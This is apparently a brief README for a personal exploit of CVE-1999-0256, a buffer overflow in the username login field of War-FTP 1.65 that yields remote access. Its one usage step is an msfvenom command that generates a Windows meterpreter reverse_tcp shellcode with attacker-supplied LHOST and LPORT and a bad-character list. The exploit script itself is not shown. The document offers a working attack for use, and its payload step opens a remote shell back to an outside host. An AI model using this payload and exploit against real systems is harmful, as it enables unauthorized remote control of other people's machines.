# CVE-1999-0256 - War-Ftp 1.65 Exploit

### An exploit I developed that exploits an overflow failure in the username login field in the war-ftp 1.65 application that gives us remote access.

## How to use

### Generate a shellcode using msfvenom by typing:
``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -s 607 -b '\x00\x40\x0a\x0d' -f py ```
